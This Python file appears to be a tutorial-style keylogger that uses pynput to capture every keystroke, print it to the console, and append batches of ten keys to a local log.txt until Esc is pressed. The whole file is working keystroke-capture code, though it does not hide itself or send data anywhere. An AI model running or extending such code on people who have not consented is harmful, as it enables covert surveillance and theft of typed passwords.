import pynput

from pynput.keyboard import Key, Listener

# after a certain amount of keys, the data will be loaded into a text file.
count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            # key without quotations = k
            k = str(key).replace("'", "")
            # if Key.space exists, will find first occurance of specified value then replace with new line char
            # if not found, returns -1
            if k.find('space') > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)


def on_release(key):

    # Exit key
    if key == Key.esc:
        return False


# on_press function used when a key is pressed
# on_release function used when a key is released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()